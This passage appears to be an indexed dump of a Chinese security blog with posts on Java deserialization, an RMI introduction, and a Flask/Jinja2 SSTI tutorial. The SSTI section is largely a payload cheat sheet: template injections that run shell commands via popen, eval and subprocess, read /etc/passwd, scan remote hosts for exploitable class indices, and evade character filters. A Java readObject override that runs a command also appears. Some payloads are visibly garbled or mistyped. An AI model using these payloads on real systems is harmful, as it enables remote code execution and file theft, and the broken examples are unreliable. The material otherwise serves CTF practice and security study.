设置serialVersionUID，在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException 再来说说writeObject()和readObject() 在writeObject中，得先创建一个ObjectOutputStream，然后利用这个把对象写入字节流，然后调用writeObject来序列化对象，代码实现如下 创建对象 创建文件流 创建对象输入流 把对象序列化写入对象输入流 释放资源关闭流 public static void serializing(String filename) throws IOException { serializeObj obj = new serializeObj(\"Huamang\"); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); } readObject就用对应的ObjectIntputStream和FileInputStream，读取加载在文件中的序列化对象并对其反序列化 public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeObj testclass = (serializeObj) in.readObject(); testclass.test(); } 然后写主类进行函数调用，最后的代码是这样的 import java.io.*; public class serializeTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String filename = \"./data.txt\"; serializeTest.serializing(filename); serializeTest.unserializing(filename); } public static void serializing(String filename) throws IOException { serializeObj obj = new serializeObj(\"Huamang\"); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); } public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeObj testclass = (serializeObj) in.readObject(); testclass.test(); } } import java.io.Serializable; public class serializeObj implements Serializable { public String name; public serializeObj(String name){ this.name = name; } public void test(){ System.out.println(\"This is \"+name); } } 成功反序列化获得对象并执行方法 ","date":"2022-09-28","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","series":null,"tags":null,"title":"[Java安全] Java反序列化","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#反序列化基础"},{"categories":["Java"],"content":"对序列化流的分析这里分析一下这个序列化数据，先转hex，然后利用工具 java -jar SerializationDumper-v1.13.jar aced00057372000c73657269616c697a654f626a2ef7c37a55dbe7910200014c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707400074875616d616e67 获得结果 STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 12 - 0x00 0c Value - serializeObj - 0x73657269616c697a654f626a serialVersionUID - 0x2e f7 c3 7a 55 db e7 91 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata serializeObj values name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 7 - 0x00 07 Value - Huamang - 0x4875616d616e67 可以看到我的name是绑定了传入的数据\"Huamang\"的，想到前面说到：允许开发者在序列化流中插入一些自定义数据 首先借鉴了feng师傅的一个图 我们的obj是实现了Serializable接口的，但是里是空的，但是这里告诉我们，我们是可以重写readObject方法的，这样我们可以把恶意代码写入这里，然后被反序列化的时候就会执行我们构造的恶意代码，比如这样重写 private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException{ stream.defaultReadObject(); Runtime.getRuntime().exec(\"calc\"); } 看起来他的作用有点像PHP中的 __wakeup，但是他们的设计理念是不一样的 Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题。 同样的，我们writeObject也是可以重写自定义的 废话不多说我们直接上代码理解 import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class serializeTest2 implements Serializable { public String name; public int id; public serializeTest2(String name, int id) { this.name = name; this.id = id; } private void writeObject(ObjectOutputStream os) throws IOException { os.defaultWriteObject(); os.writeObject(\"Write Object\"); } private void readObject(ObjectInputStream os) throws IOException, ClassNotFoundException { os.defaultReadObject(); System.out.println(os.readObject()); } } 然后修改刚刚序列化与反序列化的方法，把序列化的类换成这个类 import java.io.*; public class serializeTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String filename = \"./data.txt\"; serializeTest.serializing(filename); serializeTest.unserializing(filename); } public static void serializing(String filename) throws IOException { serializeTest2 obj = new serializeTest2(\"Huamang\",1); FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); out.writeObject(obj); out.close(); file.close(); } public static void unserializing(String filename) throws IOException, ClassNotFoundException { FileInputStream file = new FileInputStream(filename); ObjectInputStream in = new ObjectInputStream(file); serializeTest2 testclass = (serializeTest2) in.readObject(); } } 执行并分析序列化数据 STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 14 - 0x00 0e Value - serializeTest2 - 0x73657269616c697a655465737432 serialVersionUID - 0xfd 59 ea 3d 16 b4 a0 7b newHandle 0x00 7e 00 00 classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Int - I - 0x49 fieldName Length - 2 - 0x00 02 Value - id - 0x6964 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata serializeTest2 values id (int)1 - 0x00 00 00 01 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 7 - 0x00 07 Value - Huamang - 0x4875616d616e67 objectAnnotation TC_STRING - 0x74 newHandle 0x00 7e 00 04 Length - 12 - 0x00 0c Value - Write Object - 0x5772697465204f626a656374 TC_ENDBLOCKD","date":"2022-09-28","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:3:0","series":null,"tags":null,"title":"[Java安全] Java反序列化","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#对序列化流的分析"},{"categories":["Java"],"content":"前言RMI全程Remote Method Invocation，远程⽅法调⽤ 他的功能是让一个Java虚拟机上的对象调用另一个Java虚拟机中对象上的方法，是Java独有的一种机制，他是由三层架构模式来实现的 Client-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。 Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用 为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。 RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。 ","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:0:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#前言"},{"categories":["Java"],"content":"RMI简单实现","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:0:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#rmi简单实现"},{"categories":["Java"],"content":"Server首先从Server来下手： ⼀个RMIServer分为三部分： ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() ⼀个实现了此接⼝的类 ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。 首先是接口实现并继承Remote，里面创建一个hello方法，抛出RemoteException异常 public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } 然后创建一个类去实现这个接口用于远程调用 继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。 package com.example.RMI; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIServer extends UnicastRemoteObject implements IRemoteHelloWorld { protected RMIServer() throws RemoteException { super(); } @Override public String hello() throws RemoteException { return \"hello world!\"; } } 现在可以被远程调用的对象被创建好了，接下来就是思考该如何调用他了 Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。 这种电话本的思想，由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。这里分别来说说这两个东西。 先来说说 java.rmi.Naming，这是一个 final 类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下： //host:port/name： host 表示注册表所在的主机 port 表示注册表接受调用的端口号，默认为 1099 name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字 那么这样就好理解了，我们现在实现了服务端待调用的对象，现在我们要把他装载进“电话本”，也就是注册 这里是这样的步骤 利用LocateRegistry.createRegistry(1099);创建注册中心 实例化远程对象 把这个实例化对象绑定name存入“电话本” package com.example.RMI; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; public class RemoteServer { public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException { //创建注册中心 LocateRegistry.createRegistry(1099); //创建远程对象 RMIObject rmiObject = new RMIObject(); // 绑定name Naming.bind(\"rmi://localhost:1099/Hello\", rmiObject); } } 这样就算是把服务端给简单搭建好了 ","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:1:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#server"},{"categories":["Java"],"content":"Client现在来搭建服务器端，进行远程加载服务端的代码，服务端加载远程代码的步骤： 使用Naming 在Registry中寻找到名字是Hello的对象 调用远程对象的方法属性 Naming有很多方法 这里用lookup来测试，他返回：a reference for a remote object，远程对象的引用 此Naming.lookup()调用检查在 localhost 中运行的 RMI 注册表中是否存在名为“Hello”的绑定 它返回一个必须转换为我期望的任何远程接口的对象 然后就可以使用该对象调用接口中定义的远程方法 package com.example.RMI; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class RMIClient { public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException { IRemoteHelloWorld obj = (IRemoteHelloWorld) Naming.lookup(\"rmi://127.0.0.1:1099/Hello\"); System.out.println(obj.hello()); } } 这样就算简单的完成了一个RMI的操作 远程也可以加载成功（虚拟机） ","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:2:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#client"},{"categories":["Java"],"content":"RMI攻击","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:0:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#rmi攻击"},{"categories":["Java"],"content":"先留坑 https://xz.aliyun.com/t/9261 https://xz.aliyun.com/t/6660 https://redmango.top/article/70 https://paper.seebug.org/1091/ https://su18.org/post/rmi-attack ","date":"2022-09-27","objectID":"/java%E5%AE%89%E5%85%A8_rmi/:1:0","series":null,"tags":null,"title":"[Java安全] RMI","uri":"/java%E5%AE%89%E5%85%A8_rmi/#先留坑"},{"categories":["技术分享"],"content":"前言之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 ","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#前言"},{"categories":["技术分享"],"content":"Flask首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染 构造如下的代码，以及目录结构 目录结构 ├── app.py └── templates └── index.html app.py内容 from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route('/') @app.route('/index') def index(): return render_template(\"index.html\",user=request.args.get(\"name\")) if __name__ == '__main__': app.run(debug=True) index.html的内容 \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eSSTI\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eHello, {{user.name}}!\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e 可以看到这里是已经可以进行模板的渲染了，但是我们的{{7*7}}没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞 而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo @app.route('/test') def test(): template = \"\"\" \u003cdiv class=\"center-content\"\u003e \u003cp\u003eHello, %s\u003c/p\u003e \u003c/div\u003e \"\"\" % (request.args.get('name')) return render_template_string(template) 可以看到，这里是成功解析了的 ","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#flask"},{"categories":["技术分享"],"content":"攻击原理那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法 __class__ 取类 __bases__[0] 拿基类 __base__ 拿基类 __mro__ 返回一个类的调用顺序，__mro__[1]或者__mro__[-1]拿到基类 __subclasses__() 返回子类集合 __init__ 类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals __globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量 __builtins__ 是一个包含了大量内置函数的一个模块 python中所有的类的基类，都是object，我们可以这样获取类 xx.__class__，例如字符串，元组，列表 在python中每个类都有一个bases属性，这个的意思就是基类，也就是之前提到的object 拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个subclasses() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合 那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的\u003cclass ‘os._wrap_close’\u003e 不同版本的python可能会在不用的位置，我的环境里是\"\".__class__.__bases__[0].__subclasses__()[133] 这里就到了下一个点，.init.globals，这个init用来初始化类，globals用来全局查找所有方法和变量及参数 可以发现，这里是有popen的，这个就可以命令执行了 这样就可以rce了 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} 当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多 比如__mro__，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object ","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#攻击原理"},{"categories":["技术分享"],"content":"利用","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#利用"},{"categories":["技术分享"],"content":"找利用链这里我们可以用脚本来跑出我们想要的东西 本地 search = 'popen' num = -1 for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass count = -1 for i in ''.__class__.__mro__[-1].__subclasses__(): count += 1 if \"warpper\" in repr(i.__init__): pass else: try: if \"os\" in repr(i.__init__.__globals__): print(count, i) except: pass 远程 import json a = \"\"\" \u003cclass 'type'\u003e,...,\u003cclass 'subprocess.Popen'\u003e \"\"\" num = 0 allList = [] result = \"\" for i in a: if i == \"\u003e\": result += i allList.append(result) result = \"\" elif i == \"\\n\" or i == \",\": continue else: result += i for k,v in enumerate(allList): if \"os._wrap_close\" in v: print(str(k)+\"---\u003e\"+v) 或者直接利用题目环境直接搜出来，例如： 查看warnings.catch_warnings方法的位置 [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 查看linecatch的位置 [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache') 剩下的以此类推 ","date":"2022-09-19","objectID":"/ssti/:1:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#找利用链"},{"categories":["技术分享"],"content":"RCE","date":"2022-09-19","objectID":"/ssti/:2:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#rce"},{"categories":["技术分享"],"content":"eval首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号 这里脚本的原理就是通过遍历__subclasses__，然后再通过.__init__.__globals__['__builtins__']里面找是否存在eval函数字眼 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__['__builtins__']}}\" res = requests.get(url=url) if 'eval' in res.text: print(i) 我们可以记下几个含有eval函数的类： warnings.catch_warnings WarningMessage codecs.IncrementalEncoder codecs.IncrementalDecoder codecs.StreamReaderWriter os._wrap_close reprlib.Repr weakref.finalize 示例payload {{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:2:1","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#eval"},{"categories":["技术分享"],"content":"os模块Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显 而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的__init__.__globals__ 查找里面有没有导入os模块 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'os.py' in res.text: print(i) 示例payload {{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:2","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#os模块"},{"categories":["技术分享"],"content":"subprocess.popen类subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 则构造如下payload执行命令即可： {{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}} ","date":"2022-09-19","objectID":"/ssti/:2:3","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#subprocesspopen类"},{"categories":["技术分享"],"content":"linecache 函数linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块 import requests for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 示例payload {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:4","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#linecache-函数"},{"categories":["技术分享"],"content":"lipsum前段时间兴起的一条路，非常方便的可以进行rce {{lipsum.__globals__['os'].popen('whoami').read()}} {{lipsum.__globals__.os.popen('whoami').read()}} {{lipsum.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}} ","date":"2022-09-19","objectID":"/ssti/:2:5","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#lipsum"},{"categories":["技术分享"],"content":"文件读取如果实在没有命令执行，那就看看有没有文件读取的操作 python2中file类可以直接用来读取文件 {{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}} python3中没有这个file类，可以用\u003cclass '_frozen_importlib_external.FileLoader'\u003e 这个类去读取文件。 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'FileLoader' in res.text: print(i) 示例payload {{().__class__.__bases__[0].__subclasses__()[79][\"get_data\"](0, \"/etc/passwd\")}} ","date":"2022-09-19","objectID":"/ssti/:3:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#文件读取"},{"categories":["技术分享"],"content":"Bypass","date":"2022-09-19","objectID":"/ssti/:0:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#bypass"},{"categories":["技术分享"],"content":"{{绕过方法 （直接写给gitpage整报错了） ","date":"2022-09-19","objectID":"/ssti/:1:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#heading"},{"categories":["技术分享"],"content":"[]过滤了[]后，我们payload有几个地方就过不去了 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#heading-1"},{"categories":["技术分享"],"content":"getitem那么这里就可以利用函数getitem()进行获取列表元素，payload就变成这样 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:1","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#getitem"},{"categories":["技术分享"],"content":"pop最好不要用pop()，因为pop()会删除相应位置的值 {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}// 指定序列属性 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__(\"os\").popen(\"ls /\").read()')}}// 指定字典属性 ","date":"2022-09-19","objectID":"/ssti/:2:2","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#pop"},{"categories":["技术分享"],"content":"字典我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例 __builtins__.eval() {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls /\").read()')}} 等同于： [__builtins__]['eval']() {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:2:3","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#字典"},{"categories":["技术分享"],"content":"_利用request对象绕过 {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}\u0026class=__class__\u0026bases=__bases__\u0026subclasses=__subclasses__ {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}\u0026class=__class__\u0026bases=__bases__\u0026subclasses=__subclasses__ 等同于： {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:3:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#_"},{"categories":["技术分享"],"content":"引号'","date":"2022-09-19","objectID":"/ssti/:4:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#引号"},{"categories":["技术分享"],"content":"利用chr()绕过先获取chr()函数，赋值给chr，后面再拼接成一个字符串 ","date":"2022-09-19","objectID":"/ssti/:4:1","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#利用chr绕过"},{"categories":["技术分享"],"content":"利用request对象绕过示例： {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}\u0026path=/etc/passwd {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}\u0026os=os\u0026cmd=ls / 等同于： {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}} {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} 如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。 ","date":"2022-09-19","objectID":"/ssti/:4:2","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#利用request对象绕过"},{"categories":["技术分享"],"content":"点.","date":"2022-09-19","objectID":"/ssti/:5:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#点"},{"categories":["技术分享"],"content":"利用 |attr() 绕过（适用于flask）如果 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数attr()，即： ().__class__ =\u003e ()|attr(\"__class__\") 示例 {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(77)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"ls /\")|attr(\"read\")()}} 等同于 {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:5:1","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#利用-attr-绕过适用于flask"},{"categories":["技术分享"],"content":"利用中括号[ ]绕过如下示例： {{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}} 等同于： {{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:5:2","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#利用中括号-绕过"},{"categories":["技术分享"],"content":"组合绕过","date":"2022-09-19","objectID":"/ssti/:6:0","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#组合绕过"},{"categories":["技术分享"],"content":". + [] {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(77)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"ls\")|attr(\"read\")()}} ","date":"2022-09-19","objectID":"/ssti/:6:1","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#--"},{"categories":["技术分享"],"content":"__ +.+[]原payload {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} 用 __getitem__()来绕过 由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要时绕过 __和 [，就用到了我们的|attr() 最后 {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}\u0026x1=__class__\u0026x2=__base__\u0026x3=__subclasses__\u0026x4=__getitem__\u0026x5=__init__\u0026x6=__globals__\u0026x7=__builtins__\u0026x8=eval\u0026x9=__import__(\"os\").popen('ls /').read() ","date":"2022-09-19","objectID":"/ssti/:6:2","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#__-"},{"categories":["技术分享"],"content":"‘+\" {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}\u0026path=/etc/passwd ","date":"2022-09-19","objectID":"/ssti/:6:3","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#heading-2"},{"categories":["技术分享"],"content":"_+'+\" {{''[request.args.class][request.args.mro][2]request.args.subclasses.read() }}\u0026class=_class__\u0026mro=_mro__\u0026subclasses=__subclasses__ ","date":"2022-09-19","objectID":"/ssti/:6:4","series":null,"tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/#_-1"},{"categories":["技术分享"],"content":"_ +. +’ {{\"\".__class__}} {{\"\"[\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"]}} {{\"\"[\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"][\"\\\\x5F\\\\x5Fbases\\\\x5F\\\\x5F\"][0][\"\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F\"]()[91][\"get\\\\x5Fdata\"](0, \"/flag\")}} #也就是 {{\"\".__class__.__bases__[0].__subclasses__()[91].get_data(0,\"/flag\")}} 